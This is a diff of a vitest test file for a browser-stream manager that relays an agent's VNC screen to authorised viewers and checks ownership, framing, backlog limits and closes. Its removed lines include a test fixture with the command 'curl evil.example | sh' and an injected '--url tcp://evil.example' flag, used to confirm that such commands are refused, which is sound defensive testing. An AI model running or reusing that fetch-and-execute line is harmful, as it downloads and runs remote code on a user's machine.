@@ -1,601 +1,487 @@
-import { EventEmitter } from 'node:events'
-import { PassThrough } from 'node:stream'
 import { afterEach, describe, expect, it, vi } from 'vitest'
+import type { AgentBrowserFrame } from '../lib/agentFrame.js'
 import type { Asker } from './api.js'
-import { BROWSER_PACING_BYTES_PER_SECOND, BrowserStreamManager } from './browserStreams.js'
-import { sealTerminalBinary } from '../lib/e2ee/terminalSeal.js'
-import { BROWSER_CHUNK_BYTES, encodeTerminalPlain, TerminalBinaryKind, type TerminalBinaryClear } from '../lib/terminalBinary.js'
-import { ownProcessGroup } from '../lib/windows/noWindow.js'
+import { BROWSER_OPEN_WAIT_MS, BROWSER_OPENS_PENDING_MAX, BROWSER_UNACKED_MAX, createBrowserStreams } from './browserStreams.js'
+import { encodeTerminalLocal, TerminalBinaryKind } from '../lib/terminalBinary.js'
 
-// The exec the manager starts: a fake child per open, as the harness below makes them.
-const spawn = vi.hoisted(() => vi.fn())
-vi.mock('node:child_process', async (real) => ({ ...await real<object>(), spawn }))
-
-const KiB = 1024
-const ARGV = ['/opt/podman/bin/podman', 'exec', '-i', 'harness-browser-a1', 'socat', 'STDIO', 'TCP:127.0.0.1:5900']
 const LOCAL: Asker = { local: true, owner: true }
 const OTHER_DESKTOP: Asker = { local: false, owner: true, accountOwner: true }
 const SHARE_GUEST: Asker = { local: false, owner: true, accountOwner: true, guest: 'kim@acme.io' }
 const PLAIN_OWNER: Asker = { local: false, owner: true }
-const ASKERS: Record<string, Asker> = { 'local:w': LOCAL, 'mac-2': OTHER_DESKTOP, 'mac-3': OTHER_DESKTOP, 'mac-4': OTHER_DESKTOP, guest: SHARE_GUEST, share: PLAIN_OWNER }
+const ASKERS: Record<string, Asker> = { 'local:w': LOCAL, 'mac-2': OTHER_DESKTOP, guest: SHARE_GUEST, share: PLAIN_OWNER }
+const STREAM = '11111111-2222-4333-8444-555555555555'
+const OTHER = '99999999-2222-4333-8444-555555555555'
 
-type FakeChild = EventEmitter & { stdin: PassThrough; stdout: PassThrough; stderr: PassThrough; kill: ReturnType<typeof vi.fn>; exitCode: number | null; signalCode: string | null; written: () => Uint8Array; exit: (code: number | null, signal: string | null) => void }
+/** A stream's screen bytes as the agent browser frames them (services/agentBrowser.ts). */
+const screenFrame = (streamId: string, seq: number, bytes: Uint8Array) =>
+  encodeTerminalLocal({ kind: TerminalBinaryKind.browser, streamId, seq, bytes, compressed: false })!
 
-/** A child that ends when it is killed, unless told to ignore SIGTERM. */
-function fakeChild(ignoresTerm = false): FakeChild {
-  const child = new EventEmitter() as FakeChild
-  child.stdin = new PassThrough()
-  child.stdout = new PassThrough()
-  child.stderr = new PassThrough()
-  child.exitCode = null
-  child.signalCode = null
-  const chunks: Uint8Array[] = []
-  child.stdin.on('data', (chunk: Buffer) => chunks.push(new Uint8Array(chunk)))
-  child.written = () => Buffer.concat(chunks)
-  // As Node does: the exit code or signal is set as 'exit' is emitted.
-  child.exit = (code, signal) => {
-    child.exitCode = code
-    child.signalCode = signal
-    child.emit('exit', code, signal)
-  }
-  child.kill = vi.fn((signal: string = 'SIGTERM') => {
-    if (ignoresTerm && signal === 'SIGTERM') return true
-    queueMicrotask(() => child.exit(null, signal))
-    return true
-  })
-  return child
-}
-
-function harness(opts: { pauseBytes?: number; resumeBytes?: number; ignoresTerm?: boolean } = {}) {
-  const children: FakeChild[] = []
-  spawn.mockReset().mockImplementation(() => { const child = fakeChild(opts.ignoresTerm); children.push(child); return child })
+function setup(served = true) {
   const frames: Array<{ connId: string; type: string; payload: Record<string, unknown> }> = []
-  const binary: Array<{ connId: string; frame: TerminalBinaryClear }> = []
-  const measures: string[] = []
+  const binary: Array<{ connId: string; frame: Uint8Array }> = []
+  let sendOk = true
   let binaryOk = true
-  const manager = new BrowserStreamManager({
-    command: (agentId) => agentId === 'a1' || agentId === 'a2' ? { argv: ARGV } : agentId === 'starting' ? { error: 'NOT_READY' }
-      : agentId === 'shell' ? { argv: ['/bin/sh', '-c', 'curl evil.example | sh'] } : agentId === 'flags' ? { argv: [ARGV[0]!, '--url', 'tcp://evil.example', ...ARGV.slice(1)] }
-        : { error: 'NO_BROWSER' },
-    asker: (connId) => ASKERS[connId] ?? { local: false, owner: false },
-    sendTarget: (connId, type, payload) => { frames.push({ connId, type, payload }); return true },
-    sendBinaryTarget: (connId, frame) => { binary.push({ connId, frame }); return binaryOk },
-    measure: (metric) => { measures.push(metric) },
-    pacing: { bytesPerSecond: 512 * KiB },
-    window: { pauseBytes: opts.pauseBytes ?? 256 * KiB, resumeBytes: opts.resumeBytes ?? 128 * KiB },
-    chunkBytes: 32 * KiB,
-  })
-  let request = 0
-  /** Opens a stream and answers its id, or the refusal. */
-  const open = (connId: string, agentId = 'a1'): string => {
-    const requestId = `r-${++request}`
-    manager.open(connId, { requestId, agentId })
-    const result = frames.find(frame => frame.type === 'agent_browser_open_result' && frame.payload.requestId === requestId)!
-    return (result.payload.streamId ?? result.payload.error) as string
+  const port = {
+    // The agents' browsers, as their frames show them: a1's and a2's ready, one starting, one failed, and none else.
+    frameContext: vi.fn((agentId: string): AgentBrowserFrame | undefined => ({ a1: { state: 'ready' as const }, a2: { state: 'ready' as const }, starting: { state: 'starting' as const }, failed: { state: 'failed' as const, error: 'podman_old' } })[agentId]),
+    stream: vi.fn((_connId: string, _type: string, _payload: Record<string, unknown>, _asker?: Asker) => true),
+    streamInput: vi.fn((_streamId: string, _bytes: Uint8Array) => true),
+    streamClosed: vi.fn(), streamRoute: vi.fn(), streamTransportError: vi.fn(), streamRefused: vi.fn(),
   }
-  const closes = () => frames.filter(frame => frame.type === 'agent_browser_close').map(frame => [frame.connId, frame.payload.streamId, frame.payload.reason])
-  const sentBytes = (streamId: string) => binary.filter(sent => sent.frame.streamId === streamId).reduce((sum, sent) => sum + sent.frame.bytes.length, 0)
-  return { manager, children, spawn, frames, binary, measures, open, closes, sentBytes, failBinary: () => { binaryOk = false } }
+  const log = vi.fn()
+  let current: typeof port | null = served ? port : null
+  const streams = createBrowserStreams({
+    port: () => current,
+    asker: (connId) => ASKERS[connId] ?? { local: false, owner: false },
+    send: (connId, type, payload) => { frames.push({ connId, type, payload }); return sendOk },
+    sendBinary: (connId, frame) => { binary.push({ connId, frame }); return binaryOk },
+    log,
+  })
+  /** A stream [connId] holds: asked, and answered by the service. */
+  const opened = (connId: string, streamId = STREAM, requestId = 'r-1') => {
+    streams.open(connId, { requestId, agentId: 'a1' })
+    expect(streams.frame(connId, 'agent_browser_open_result', { requestId, streamId })).toBe(true)
+    frames.length = 0
+    port.stream.mockClear()
+  }
+  return { streams, port, frames, binary, log, opened, off: () => { current = null }, failSend: () => { sendOk = false }, failBinary: () => { binaryOk = false } }
 }
 
-const bytes = (length: number, fill = 7) => Buffer.alloc(length, fill)
-
-afterEach(() => { vi.useRealTimers() })
-
-describe('opening a browser stream', () => {
-  it('open allowed for a local asker and for accountOwner', () => {
-    const h = harness()
-    const local = h.open('local:w')
-    const remote = h.open('mac-2')
-    expect(local).toMatch(/^[0-9a-f-]{36}$/)
-    expect(remote).toMatch(/^[0-9a-f-]{36}$/)
-    expect(local).not.toBe(remote)
-    expect(h.spawn).toHaveBeenCalledTimes(2)
-  })
-
-  // Review Focus 1: a verified machine share is `owner` too, and must never open the owner's logged-in browser.
-  it('open refused for a share guest whose owner flag is true', () => {
-    const h = harness()
-    expect(h.open('guest')).toBe('NOT_OWNER')
-    expect(h.spawn).not.toHaveBeenCalled()
-  })
-
-  it('open refused for owner:true without local or accountOwner', () => {
-    const h = harness()
-    expect(h.open('share')).toBe('NOT_OWNER')
-    expect(h.spawn).not.toHaveBeenCalled()
-  })
-
-  it('open passes NO_BROWSER and NOT_READY through from the port', () => {
-    const h = harness()
-    expect(h.open('local:w', 'none')).toBe('NO_BROWSER')
-    expect(h.open('local:w', 'starting')).toBe('NOT_READY')
-    expect(h.spawn).not.toHaveBeenCalled()
-  })
-
-  // The audit of 2026-11-12 (Security 1): the core started whatever command line the agent browser's process gave it.
-  it('open starts nothing but the exec into a browser\'s container, whatever the port names', () => {
-    const h = harness()
-    const warned = vi.spyOn(console, 'warn').mockImplementation(() => {})
-    for (const agentId of ['shell', 'flags']) expect(h.open('local:w', agentId), agentId).toBe('NOT_READY')
-    expect(h.spawn).not.toHaveBeenCalled()
-    expect(warned.mock.calls).toEqual([
-      ['[agent-browser] refused a stream command that is not the exec into a browser\'s container (agent shell)'],
-      ['[agent-browser] refused a stream command that is not the exec into a browser\'s container (agent flags)'],
+describe('opening a browser stream, as the core passes it on', () => {
+  it('hands a window\'s open, and another of the owner\'s desktops\', to the agent browser with who asked', () => {
+    const { streams, port, frames } = setup()
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    streams.open('mac-2', { requestId: 'r-2', agentId: 'a1' })
+    expect(port.stream.mock.calls).toEqual([
+      ['local:w', 'agent_browser_open', { requestId: 'r-1', agentId: 'a1' }, LOCAL],
+      ['mac-2', 'agent_browser_open', { requestId: 'r-2', agentId: 'a1' }, OTHER_DESKTOP],
     ])
-    warned.mockRestore()
+    expect(frames).toEqual([])
   })
 
-  it('open spawns the port\'s argv with ownProcessGroup', () => {
-    const h = harness()
-    h.open('local:w')
-    expect(h.spawn).toHaveBeenCalledWith(ARGV[0], ARGV.slice(1), expect.objectContaining({ stdio: 'pipe', ...ownProcessGroup() }))
+  // Review Focus 1: a verified machine share is `owner` too, and must never open the owner's logged-in browser. The
+  // core decides it, before the service hears of it.
+  it('refuses a share\'s guest, and an owner that is neither on this computer nor the account\'s own, without telling the service', () => {
+    const { streams, port, frames } = setup()
+    streams.open('guest', { requestId: 'r-1', agentId: 'a1' })
+    streams.open('share', { requestId: 'r-2', agentId: 'a1' })
+    streams.open('nobody', { requestId: 'r-3', agentId: 'a1' })
+    expect(port.stream).not.toHaveBeenCalled()
+    expect(frames).toEqual(['guest', 'share', 'nobody'].map((connId, index) => ({ connId, type: 'agent_browser_open_result', payload: { requestId: `r-${index + 1}`, error: 'NOT_OWNER' } })))
   })
 
-  it('fifth viewer refused with VIEWER_LIMIT', () => {
-    const h = harness()
-    for (const connId of ['local:w', 'mac-2', 'mac-3', 'mac-4']) expect(h.open(connId)).toMatch(/^[0-9a-f-]{36}$/)
-    expect(h.open('local:w')).toBe('VIEWER_LIMIT')
-    expect(h.spawn).toHaveBeenCalledTimes(4)
-    // Another agent's browser has viewers of its own.
-    expect(h.open('local:w', 'a2')).toMatch(/^[0-9a-f-]{36}$/)
+  it('answers nothing to an open with no request id', () => {
+    const { streams, port, frames } = setup()
+    streams.open('local:w', { agentId: 'a1' })
+    expect(port.stream).not.toHaveBeenCalled()
+    expect(frames).toEqual([])
   })
 
-  it('an open counts agent_browser_stream_opened, and a close counts agent_browser_stream_closed_<reason>', () => {
-    const h = harness()
-    const streamId = h.open('local:w')
-    h.open('guest')
-    h.manager.close('local:w', { streamId })
-    expect(h.measures).toEqual(['agent_browser_stream_opened', 'agent_browser_stream_closed_closed'])
+  // As before the stream was its service's: the core answered these from the state it keeps for the agent's frame.
+  it('answers in line for an agent with no browser, or one that is not ready, and asks nobody', () => {
+    const { streams, port, frames } = setup()
+    streams.open('local:w', { requestId: 'r-1', agentId: 'plain' })
+    streams.open('local:w', { requestId: 'r-2' })
+    streams.open('local:w', { requestId: 'r-3', agentId: 7 })
+    streams.open('local:w', { requestId: 'r-4', agentId: 'starting' })
+    streams.open('local:w', { requestId: 'r-5', agentId: 'failed' })
+    expect(port.stream).not.toHaveBeenCalled()
+    expect(frames.map(frame => [frame.payload.requestId, frame.payload.error])).toEqual([['r-1', 'NO_BROWSER'], ['r-2', 'NO_BROWSER'], ['r-3', 'NO_BROWSER'], ['r-4', 'NOT_READY'], ['r-5', 'NOT_READY']])
+    // None of them is waited for.
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-4', streamId: STREAM })).toBe(false)
+    // The agent browser off: no agent has one.
+    const off = setup(false)
+    off.streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    expect(off.frames).toEqual([{ connId: 'local:w', type: 'agent_browser_open_result', payload: { requestId: 'r-1', error: 'NO_BROWSER' } }])
+  })
+
+  it('refuses an open at once while nobody takes it: the agent browser\'s process is not there', () => {
+    // Its browser reads ready, as it last said, and its process did not take the open: gone, or one from before
+    // streams were its own.
+    const untaken = setup()
+    untaken.port.stream.mockReturnValue(false)
+    untaken.streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    expect(untaken.frames).toEqual([{ connId: 'local:w', type: 'agent_browser_open_result', payload: { requestId: 'r-1', error: 'NOT_READY' } }])
+    // Refused, it is not waited for: an answer that comes for it after all is nobody's.
+    expect(untaken.streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-1', streamId: STREAM })).toBe(false)
+    // An open the same connection still waits for keeps its place.
+    const waiting = setup()
+    waiting.streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    waiting.port.stream.mockReturnValueOnce(false)
+    waiting.streams.open('local:w', { requestId: 'r-2', agentId: 'a1' })
+    expect(waiting.streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-1', streamId: STREAM })).toBe(true)
+  })
+
+  it('holds a few opens unanswered for one connection, and no more', () => {
+    const { streams, port, frames } = setup()
+    for (let index = 0; index < BROWSER_OPENS_PENDING_MAX; index++) streams.open('local:w', { requestId: `r-${index}`, agentId: 'a1' })
+    expect(port.stream).toHaveBeenCalledTimes(BROWSER_OPENS_PENDING_MAX)
+    streams.open('local:w', { requestId: 'r-more', agentId: 'a1' })
+    expect(port.stream).toHaveBeenCalledTimes(BROWSER_OPENS_PENDING_MAX)
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_open_result', payload: { requestId: 'r-more', error: 'VIEWER_LIMIT' } }])
+    // Another connection has its own; and an answer frees a place.
+    streams.open('mac-2', { requestId: 'r-0', agentId: 'a1' })
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-0', error: 'NO_BROWSER' })).toBe(true)
+    streams.open('local:w', { requestId: 'r-again', agentId: 'a1' })
+    expect(port.stream).toHaveBeenCalledTimes(BROWSER_OPENS_PENDING_MAX + 2)
   })
 })
 
-describe('the bytes of a browser stream', () => {
-  it('stdout becomes kind-8 frames of at most chunkBytes', () => {
-    const h = harness()
-    const streamId = h.open('local:w')
-    const screen = Buffer.concat([bytes(40 * KiB, 1), bytes(60 * KiB, 2)])
-    h.children[0].stdout.emit('data', screen)
-    expect(h.binary.map(sent => sent.frame.bytes.length)).toEqual([32 * KiB, 32 * KiB, 32 * KiB, 4 * KiB])
-    expect(h.binary.every(sent => sent.connId === 'local:w' && sent.frame.kind === TerminalBinaryKind.browser && sent.frame.streamId === streamId)).toBe(true)
-    expect(h.binary.map(sent => sent.frame.seq)).toEqual([0, 1, 2, 3])
-    expect(Buffer.concat(h.binary.map(sent => sent.frame.bytes)).equals(screen)).toBe(true)
+describe('whose a browser stream is', () => {
+  it('passes an open\'s answer only to the connection that asked, under the request it asked with', () => {
+    const { streams, frames } = setup()
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    // Another connection's, another request's, one with no request: not this open's answer.
+    expect(streams.frame('mac-2', 'agent_browser_open_result', { requestId: 'r-1', streamId: STREAM })).toBe(false)
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-9', streamId: STREAM })).toBe(false)
+    expect(streams.frame('local:w', 'agent_browser_open_result', { streamId: STREAM })).toBe(false)
+    expect(frames).toEqual([])
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-1', streamId: STREAM })).toBe(true)
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_open_result', payload: { requestId: 'r-1', streamId: STREAM } }])
+    // Answered once: a second answer to the same open is nobody's.
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-1', streamId: OTHER })).toBe(false)
   })
 
-  it('input bytes reach the child\'s stdin', () => {
-    const h = harness()
-    const streamId = h.open('local:w')
-    const version = new TextEncoder().encode('RFB 003.008\n')
-    h.manager.input('local:w', streamId, version)
-    // Another connection cannot type into it.
-    h.manager.input('mac-2', streamId, new Uint8Array([1]))
-    expect(Buffer.from(h.children[0].written()).equals(Buffer.from(version))).toBe(true)
-  })
-
-  it('a local connection\'s stream is direct and is not paced', () => {
-    vi.useFakeTimers()
-    const h = harness({ pauseBytes: 4096 * KiB, resumeBytes: 2048 * KiB })
-    const streamId = h.open('local:w')
-    h.children[0].stdout.emit('data', bytes(1024 * KiB))
-    expect(h.sentBytes(streamId)).toBe(1024 * KiB)
-    // The direct profile: Tight at quality 6 and compression 2.
-    h.manager.input('local:w', streamId, new TextEncoder().encode('RFB 003.008\n'))
-    h.manager.input('local:w', streamId, Uint8Array.of(1, 1)) // security type, ClientInit
-    h.manager.input('local:w', streamId, Uint8Array.of(2, 0, 0, 1, 0, 0, 0, 7)) // SetEncodings [Tight]
-    const written = h.children[0].written().subarray(14)
-    const view = new DataView(written.buffer, written.byteOffset, written.byteLength)
-    expect([view.getInt32(4), view.getInt32(8), view.getInt32(12)]).toEqual([7, -32 + 6, -256 + 2])
-  })
-
-  it('a remote stream is paced as a relayed one until its route is known, and takes its route\'s profile', () => {
-    const h = harness()
-    const streamId = h.open('mac-2')
-    const encodings = () => {
-      const written = h.children[0].written()
-      const view = new DataView(written.buffer, written.byteOffset, written.byteLength)
-      const out: number[][] = []
-      for (let at = 14; at < written.length;) {
-        const count = view.getUint16(at + 2)
-        out.push(Array.from({ length: count }, (_, i) => view.getInt32(at + 4 + 4 * i)))
-        at += 4 + 4 * count
-      }
-      return out
+  it('holds no stream an answer names that is not a stream\'s id, and refuses the open', () => {
+    const { streams, frames } = setup()
+    for (const [index, streamId] of [[1, 'stream-1'], [2, 'AAAAAAAA-2222-4333-8444-555555555555'], [3, 7], [4, '']] as const) {
+      streams.open('local:w', { requestId: `r-${index}`, agentId: 'a1' })
+      expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: `r-${index}`, streamId })).toBe(false)
     }
-    h.manager.input('mac-2', streamId, new TextEncoder().encode('RFB 003.008\n'))
-    h.manager.input('mac-2', streamId, Uint8Array.of(1, 1, 2, 0, 0, 1, 0, 0, 0, 7))
-    h.manager.route(streamId, 'turn')
-    expect(encodings()).toEqual([[7, -32 + 3, -256 + 6], [7, -32 + 3, -256 + 6]])
-    h.manager.route(streamId, 'direct')
-    expect(encodings().at(-1)).toEqual([7, -32 + 6, -256 + 2])
+    expect(frames.map(frame => frame.payload)).toEqual([1, 2, 3, 4].map(index => ({ requestId: `r-${index}`, error: 'NOT_READY' })))
   })
 
-  it('the total output of relay and turn streams is paced to bytesPerSecond, shared between them; a direct stream is not paced', async () => {
+  // The service names a stream once. Were a second answer to move one a window holds, that window's screen would go to
+  // the other connection, and its own acks and close would no longer be its stream's. A service that does it is
+  // broken: the stream ends for both, and the service is told to end it.
+  it('never hands a stream one connection holds to another: the stream ends, and the second open is refused', () => {
+    const { streams, port, frames, binary, opened } = setup()
+    opened('local:w')
+    streams.open('mac-2', { requestId: 'r-2', agentId: 'a1' })
+    expect(streams.frame('mac-2', 'agent_browser_open_result', { requestId: 'r-2', streamId: STREAM })).toBe(false)
+    expect(frames).toEqual([
+      { connId: 'local:w', type: 'agent_browser_close', payload: { streamId: STREAM, reason: 'agent' } },
+      { connId: 'mac-2', type: 'agent_browser_open_result', payload: { requestId: 'r-2', error: 'NOT_READY' } },
+    ])
+    expect(port.streamRefused).toHaveBeenCalledExactlyOnceWith(STREAM)
+    expect(streams.bytes(screenFrame(STREAM, 0, Uint8Array.of(1)))).toBe(false)
+    expect(binary).toEqual([])
+  })
+
+  it('holds no stream for a refusal', () => {
+    const { streams, port, binary } = setup()
+    streams.open('local:w', { requestId: 'r-1', agentId: 'a1' })
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-1', error: 'NOT_READY' })).toBe(true)
+    expect(streams.bytes(screenFrame(STREAM, 0, new Uint8Array(4)))).toBe(false)
+    expect(binary).toEqual([])
+    streams.input('local:w', STREAM, new Uint8Array(2))
+    expect(port.streamInput).not.toHaveBeenCalled()
+  })
+
+  it('hands the screen\'s bytes to the connection that holds the stream, as browser frames, and to no other', () => {
+    const { streams, binary, opened } = setup()
+    opened('local:w')
+    const screen = Uint8Array.of(1, 2, 3)
+    const frame = screenFrame(STREAM, 7, screen)
+    expect(streams.bytes(frame)).toBe(true)
+    // Sent on as it came: the very bytes, never a copy.
+    expect(binary).toEqual([{ connId: 'local:w', frame }])
+    expect(binary[0]!.frame).toBe(frame)
+    // The service names a stream and never a connection: one nobody holds goes nowhere.
+    expect(streams.bytes(screenFrame(OTHER, 8, screen))).toBe(false)
+    expect(binary).toHaveLength(1)
+  })
+
+  it('sends on nothing that is not a browser\'s screen frame, whole', () => {
+    const { streams, binary, opened } = setup()
+    opened('local:w')
+    const frame = screenFrame(STREAM, 0, Uint8Array.of(1, 2))
+    const changed = (at: number, value: number) => { const copy = Uint8Array.from(frame); copy[at] = value; return copy }
+    for (const wrong of [
+      // A terminal's output, keys or keyframe for the same stream id, a compressed one, one cut short or with more after.
+      encodeTerminalLocal({ kind: TerminalBinaryKind.output, streamId: STREAM, seq: 0, bytes: Uint8Array.of(1), compressed: false })!,
+      encodeTerminalLocal({ kind: TerminalBinaryKind.input, streamId: STREAM, seq: 0, bytes: Uint8Array.of(1), compressed: false })!,
+      changed(6, 1), changed(7, 1), changed(4, 9), changed(0, 0), frame.subarray(0, frame.length - 1), Uint8Array.from([...frame, 0]),
+      frame.subarray(0, 35), new Uint8Array(0),
+    ]) expect(streams.bytes(wrong)).toBe(false)
+    expect(binary).toEqual([])
+    // A seq past what a number holds exactly.
+    const far = Uint8Array.from(frame)
+    new DataView(far.buffer).setBigUint64(12 + 16, 2n ** 60n, false)
+    expect(streams.bytes(far)).toBe(false)
+    expect(streams.bytes(frame)).toBe(true)
+  })
+
+  it('ends a stream whose send its viewer\'s transport refused, which is a hole in the screen: the viewer and the service are told', () => {
+    const { streams, port, frames, binary, opened, failBinary } = setup()
+    opened('local:w')
+    failBinary()
+    expect(streams.bytes(screenFrame(STREAM, 0, new Uint8Array(8)))).toBe(false)
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_close', payload: { streamId: STREAM, reason: 'backlog' } }])
+    expect(port.streamRefused).toHaveBeenCalledExactlyOnceWith(STREAM)
+    // The core forgot it: the service's own close for it, and its bytes after, are nobody's.
+    expect(streams.frame('local:w', 'agent_browser_close', { streamId: STREAM, reason: 'backlog' })).toBe(false)
+    expect(streams.bytes(screenFrame(STREAM, 1, new Uint8Array(8)))).toBe(false)
+    expect(binary).toHaveLength(1)
+    expect(port.streamRefused).toHaveBeenCalledTimes(1)
+  })
+
+  // The agent browser holds each stream's credit (a 256 KiB window). The core does not lean on it: a window's send has
+  // no limit of its own, so a service that stopped counting would grow the core's buffer to that window for good.
+  it('ends a stream whose viewer has more than BROWSER_UNACKED_MAX unread, whatever the service counts; acks make room', () => {
+    const { streams, port, frames, opened } = setup()
+    opened('local:w')
+    const chunk = new Uint8Array(BROWSER_UNACKED_MAX / 4)
+    for (let seq = 0; seq < 4; seq++) expect(streams.bytes(screenFrame(STREAM, seq, chunk))).toBe(true)
+    // An ack the viewer sends, through the core, makes room; one that is no count makes none.
+    for (const bytes of [-1, 0, Number.NaN, Number.POSITIVE_INFINITY, '9', undefined]) streams.ack('local:w', { streamId: STREAM, bytes })
+    streams.ack('local:w', { streamId: STREAM, bytes: chunk.length })
+    expect(port.stream).toHaveBeenCalledTimes(7)
+    expect(streams.bytes(screenFrame(STREAM, 4, chunk))).toBe(true)
+    // An ack of more than was sent leaves nothing owed, and nothing in hand to send beyond the bound.
+    streams.ack('local:w', { streamId: STREAM, bytes: 10 * BROWSER_UNACKED_MAX })
+    for (let seq = 5; seq < 9; seq++) expect(streams.bytes(screenFrame(STREAM, seq, chunk))).toBe(true)
+    expect(frames).toEqual([])
+    // One byte past it.
+    expect(streams.bytes(screenFrame(STREAM, 9, Uint8Array.of(1)))).toBe(false)
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_close', payload: { streamId: STREAM, reason: 'backlog' } }])
+    expect(port.streamRefused).toHaveBeenCalledExactlyOnceWith(STREAM)
+    // An ack for another connection's stream, or none, is passed on nowhere.
+    streams.ack('mac-2', { streamId: STREAM, bytes: 1 })
+    expect(port.stream).toHaveBeenCalledTimes(8)
+  })
+
+  it('passes a viewer\'s ack, close and bytes on only for a stream that connection holds', () => {
+    const { streams, port, opened } = setup()
+    opened('local:w')
+    streams.ack('local:w', { streamId: STREAM, bytes: 64 })
+    streams.input('local:w', STREAM, Uint8Array.of(9))
+    streams.close('local:w', { streamId: STREAM })
+    // Who asked goes with an open alone: an ack and a close are the stream's own, and acks come 30 times a second.
+    expect(port.stream.mock.calls).toEqual([
+      ['local:w', 'agent_browser_ack', { streamId: STREAM, bytes: 64 }],
+      ['local:w', 'agent_browser_close', { streamId: STREAM }],
+    ])
+    expect(port.streamInput).toHaveBeenCalledExactlyOnceWith(STREAM, Uint8Array.of(9))
+    port.stream.mockClear()
+    // Another connection's word on it, a stream nobody holds, and no stream named: nothing is passed on.
+    streams.ack('mac-2', { streamId: STREAM, bytes: 64 })
+    streams.close('mac-2', { streamId: STREAM })
+    streams.input('mac-2', STREAM, Uint8Array.of(9))
+    streams.ack('local:w', { streamId: OTHER, bytes: 64 })
+    streams.close('local:w', {})
+    expect(port.stream).not.toHaveBeenCalled()
+    expect(port.streamInput).toHaveBeenCalledTimes(1)
+  })
+
+  it('passes the service\'s close on to the stream\'s connection, once, and holds it no more', () => {
+    const { streams, frames, opened } = setup()
+    opened('local:w')
+    expect(streams.frame('mac-2', 'agent_browser_close', { streamId: STREAM, reason: 'agent' })).toBe(false)
+    expect(streams.frame('local:w', 'agent_browser_close', { streamId: OTHER, reason: 'agent' })).toBe(false)
+    expect(streams.frame('local:w', 'agent_browser_close', { streamId: STREAM, reason: 'agent' })).toBe(true)
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_close', payload: { streamId: STREAM, reason: 'agent' } }])
+    expect(streams.frame('local:w', 'agent_browser_close', { streamId: STREAM, reason: 'agent' })).toBe(false)
+    expect(streams.bytes(screenFrame(STREAM, 1, new Uint8Array(1)))).toBe(false)
+    // No other frame is a stream's to send a viewer.
+    expect(streams.frame('local:w', 'terminal_output', { streamId: STREAM })).toBe(false)
+  })
+
+  it('says whether a frame reached its connection', () => {
+    const { streams, opened, failSend } = setup()
+    opened('local:w')
+    failSend()
+    expect(streams.frame('local:w', 'agent_browser_close', { streamId: STREAM, reason: 'closed' })).toBe(false)
+  })
+})
+
+describe('what ends a browser stream on the core\'s side', () => {
+  it('forgets a connection that ended, and tells the service', () => {
+    const { streams, port, opened } = setup()
+    opened('local:w')
+    opened('mac-2', OTHER, 'r-2')
+    streams.open('local:w', { requestId: 'r-3', agentId: 'a1' })
+    streams.closeConnection('local:w')
+    expect(port.streamClosed).toHaveBeenCalledExactlyOnceWith('local:w')
+    expect(streams.bytes(screenFrame(STREAM, 0, new Uint8Array(1)))).toBe(false)
+    expect(streams.frame('local:w', 'agent_browser_open_result', { requestId: 'r-3', streamId: STREAM })).toBe(false)
+    // The other connection's stream goes on.
+    expect(streams.bytes(screenFrame(OTHER, 0, new Uint8Array(1)))).toBe(true)
+  })
+
+  // In the core's process the service is the port; out of it, its process hears every connection's end itself, as
+  // every service does, and the link says nothing (core/agentBrowserLink.ts).
+  it('tells the service of every connection\'s end, one that never watched too', () => {
+    const { streams, port } = setup()
+    streams.closeConnection('phone-1')
+    expect(port.streamClosed.mock.calls).toEqual([['phone-1']])
+  })
+
+  it('passes the gateway\'s word on a stream\'s route, and that it went away, for a stream that is held', () => {
+    const { streams, port, opened } = setup()
+    opened('mac-2')
+    streams.route(STREAM, 'direct')
+    streams.routeLost(STREAM)
+    streams.route(OTHER, 'relay')
+    streams.routeLost(OTHER)
+    expect(port.streamRoute.mock.calls).toEqual([[STREAM, 'direct'], [STREAM, null]])
+    streams.transportError()
+    expect(port.streamTransportError).toHaveBeenCalledOnce()
+  })
+
+  it('tells every viewer its stream closed when the agent browser goes, and every open still asked that it is not ready', () => {
+    const { streams, frames, opened } = setup()
+    opened('local:w')
+    opened('mac-2', OTHER, 'r-2')
+    streams.open('local:w', { requestId: 'r-3', agentId: 'a1' })
+    frames.length = 0
+    streams.gone()
+    expect(frames).toEqual([
+      { connId: 'local:w', type: 'agent_browser_close', payload: { streamId: STREAM, reason: 'agent' } },
+      { connId: 'mac-2', type: 'agent_browser_close', payload: { streamId: OTHER, reason: 'agent' } },
+      { connId: 'local:w', type: 'agent_browser_open_result', payload: { requestId: 'r-3', error: 'NOT_READY' } },
+    ])
+    // Nothing is held after it.
+    frames.length = 0
+    streams.gone()
+    expect(frames).toEqual([])
+    expect(streams.bytes(screenFrame(STREAM, 0, new Uint8Array(1)))).toBe(false)
+  })
+
+  it('passes nothing on while the agent browser is off', () => {
+    const { streams, port, frames, opened, off } = setup()
+    opened('local:w')
+    off()
+    streams.ack('local:w', { streamId: STREAM, bytes: 1 })
+    streams.close('local:w', { streamId: STREAM })
+    // A viewer's bytes that reach nobody would leave VNC reading the rest of its stream wrong: it ends.
+    streams.input('local:w', STREAM, Uint8Array.of(1))
+    expect(frames).toEqual([{ connId: 'local:w', type: 'agent_browser_close', payload: { streamId: STREAM, reason: 'agent' } }])
+    streams.route(STREAM, 'relay')
+    streams.routeLost(STREAM)
+    streams.transportError()
+    streams.closeConnection('local:w')
+    expect(port.stream).not.toHaveBeenCalled()
+    expect(port.streamInput).not.toHaveBeenCalled()
+    expect(port.streamRoute).not.toHaveBeenCalled()
